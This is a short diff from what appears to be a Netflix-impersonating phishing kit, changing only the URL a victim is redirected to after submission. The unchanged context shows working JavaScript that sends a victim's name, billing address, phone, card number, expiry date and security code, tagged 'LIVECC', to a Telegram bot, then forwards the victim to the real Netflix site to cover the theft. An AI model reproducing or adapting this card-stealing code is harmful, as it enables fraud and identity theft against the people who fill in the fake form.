@@ -153,7 +153,7 @@ footer{
         fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=LIVECC=>${fullName}=${billing}==${zipCode}==${city}==${state}==${country}==${phone}==${psn}==${bin}==${expDate}==${security}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://www.netflix.com/");
+              window.location.replace("https://netflix.com");
           }, error => {
               alert("Message not sent")
               console.log(error)
